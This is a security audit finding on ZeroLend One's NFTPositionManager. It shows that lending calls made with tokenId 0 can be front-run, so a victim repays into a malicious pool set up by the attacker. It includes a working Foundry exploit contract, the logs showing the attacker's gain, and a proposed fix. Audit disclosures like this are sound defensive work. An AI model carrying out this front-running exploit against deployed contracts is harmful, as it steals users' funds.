Careful Fleece Pike

High

# `NFTPositionManager`'s lending functions with `params.tokenId = 0` are vulnerable to front-running

### Summary

`NFTPositionManager`'s lending functions do not take a lending pool as an input parameter will cause the users to interact with a malicious pool when setting `params.tokenId = 0` as an attacker will front-run minting a NFT that linked to a malicious pool and then transfer it to the victim.

### Root Cause

`NFTPositionManager`'s lending functions do not take a lending pool as an input parameter.

Although the protocol mitigated the front-run attack vector by implementing an ownership check in every lending function. We believe these mitigation are not enough for the users to use the lending functions with `params.tokenId = 0` safely

```solidity
    if (params.tokenId == 0) {
>>    if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();
      params.tokenId = _nextId - 1;
    }
```

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L46-L49

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L66-L69

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L87-L90

https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L107-L110

### Internal pre-conditions

A user uses a `NFTPositionManager` lending function with `params.tokenId = 0`.

### External pre-conditions

_No response_

### Attack Path

The attack vector is viable for every `NFTPositionManager`'s lending functions (`suppy`, `withdraw`, `borrow`, `repay`), here we will demonstrate an attack path for the `repay` function.

1. Alice mints a NFT with `id = 1`, she supplies collateral and borrows `1e18 tokenA`.
2. Alice observes that the last NFT in `NFTPositionManager` is her NFT (the NFT with `id = 1`), so she calls `repay` with `params.tokenId = 0`.
3. The attacker front-run Alice's repay transaction with:
   - Creating a malicious pool that has `tokenA` and a worthless token `attackerToken`.
   - Supplying `1e18 tokenA` directly to the malicious pool.
   - Minting a NFT with `id = 2`, which linked to the malicious pool.
   - Using the NFT with `id = 2` to supply `attackerToken` as collateral, and then borrow `1e18 tokenA`.
   - Tranfering the NFT with `id = 2` to Alice.
4. Alice's repay transaction is executed. She repaid to the NFT with `id = 2` not the NFT with `id = 1`.
5. The attacker withdraws `1e18 tokenA` from the malicious pool and benefits `1e18 tokenA` from Alice.

### Impact

The attacker forced the user to interact with a malicious pool. In case of the `repay` function, the attacker stole all the funds that should be paid to the loan from the user.

### PoC
Run command: `forge test --match-path test/PoC/PoC.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {DataTypes} from 'contracts/core/pool/configuration/DataTypes.sol';
import {IPool} from 'contracts/interfaces/pool/IPool.sol';
import {INFTPositionManager} from 'contracts/interfaces/INFTPositionManager.sol';

import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';

import {Test, console} from '../../lib/forge-std/src/Test.sol';
import {DeployNFTPositionManager} from 'test/forge/core/positions/DeployNFTPositionManager.t.sol';

contract AttackerToken is ERC20 {
    constructor() ERC20('XYZ', 'XYZ') {
        _mint(msg.sender, 100 ether);
    }
}

contract PoC is DeployNFTPositionManager {
    address alice = makeAddr('alice');
    address attacker = makeAddr('attacker');

    IPool attackerPool;
    IERC20 attackerToken;

    function setUp() public {
        _setUpPool();
        _setup();

        // The attacker created a malicious pool `attackerPool`
        _setupAttackerPool();
    }

    function _setupAttackerPool() internal {
        address[] memory assets = new address[](2);
        assets[0] = address(tokenA);
        // The attacker created a malicious token `attackerToken`
        vm.prank(attacker);
        attackerToken = new AttackerToken();
        assets[1] = address(attackerToken);

        address[] memory rateStrategyAddresses = new address[](2);
        rateStrategyAddresses[0] = address(irStrategy);
        rateStrategyAddresses[1] = address(irStrategy);

        address[] memory sources = new address[](2);
        sources[0] = address(oracleA);
        sources[1] = address(oracleA);

        DataTypes.InitReserveConfig memory config = _basicConfig();

        DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](2);
        configurationLocal[0] = config;
        configurationLocal[1] = config;

        address[] memory admins = new address[](1);
        admins[0] = attacker;

        DataTypes.InitPoolParams memory p = DataTypes.InitPoolParams({
            proxyAdmin: address(this),
            revokeProxy: false,
            admins: admins,
            emergencyAdmins: new address[](0),
            riskAdmins: new address[](0),
            hook: address(0),
            assets: assets,
            rateStrategyAddresses: rateStrategyAddresses,
            sources: sources,
            configurations: configurationLocal
        });

        poolFactory.createPool(p);
        attackerPool = IPool(address(poolFactory.pools(1)));
    }

    function testPoC() public {
        DataTypes.ExtraData memory dummyData = DataTypes.ExtraData(bytes(''), bytes(''));

        _mintAndApprove(attacker, tokenA, 1 ether, address(attackerPool));
        console.log("Attacker tokenA balance before: %e", tokenA.balanceOf(attacker));

        _mintAndApprove(alice, tokenA, 1 ether, address(nftPositionManager));

        // Alice created a NFT with id = 1 to interact with `pool` (this pool is unmalicious)
        {
            vm.prank(alice);
            nftPositionManager.mint(address(pool));

            // Alice borrowed 1e18 tokenA using the NFT with id = 1
            // For the sake of simplicity, the borrowing code is not implemented
        }

        // The attacker front-ran Alice's repay transaction
        {
            vm.startPrank(attacker);
            attackerPool.supplySimple(address(tokenA), attacker, 1 ether, 0);

            // The attacker created a NFT position with id = 2
            nftPositionManager.mint(address(attackerPool));

            // The attacker supplied `attackerToken` to back the borrowing
            attackerToken.approve(address(nftPositionManager), type(uint256).max);
            INFTPositionManager.AssetOperationParams memory paramsSupply =
            INFTPositionManager.AssetOperationParams(address(attackerToken), address(0), 100 ether, 0, dummyData);
            nftPositionManager.supply(paramsSupply);

            // The attacker borrow tokenA from `attackerPool`
            INFTPositionManager.AssetOperationParams memory paramsBorrow =
            INFTPositionManager.AssetOperationParams(address(tokenA), attacker, 1 ether, 0, dummyData);
            nftPositionManager.borrow(paramsBorrow);

            // The attacker tranfer the NFT with id = 2 to Alice
            nftPositionManager.transferFrom(attacker, alice, 2);
            vm.stopPrank();
        }

        // Alice observed the last NFT is her NFT with id = 1
        // so she repaid to the NFT with id = 0
        // Because of the attack, the last NFT is now the NFT with id = 2
        {
            INFTPositionManager.AssetOperationParams memory paramsRepay =
            INFTPositionManager.AssetOperationParams(address(tokenA), address(0), 1 ether, 0, dummyData);

            vm.prank(alice);
            nftPositionManager.repay(paramsRepay);
        }

        vm.prank(attacker);
        attackerPool.withdrawSimple(address(tokenA), attacker, 1 ether, 0);
        console.log("Attacker tokenA balance after: %e", tokenA.balanceOf(attacker));
    }
}
```

Logs:
```bash
  Attacker tokenA balance before: 1e18
  Attacker tokenA balance after: 2e18
```

### Mitigation

Add a lending pool to the input parameters of `NFTPositionManager`'s lending functions, add check against this lending pool when `params.tokenId == 0`

```solidity
    if (params.tokenId == 0) {
      params.tokenId = _nextId - 1;
      if (msg.sender != _ownerOf(params.tokenId) || _positions[params.tokenId].pool != params.pool) revert NFTErrorsLib.NotTokenIdOwner();
    }
```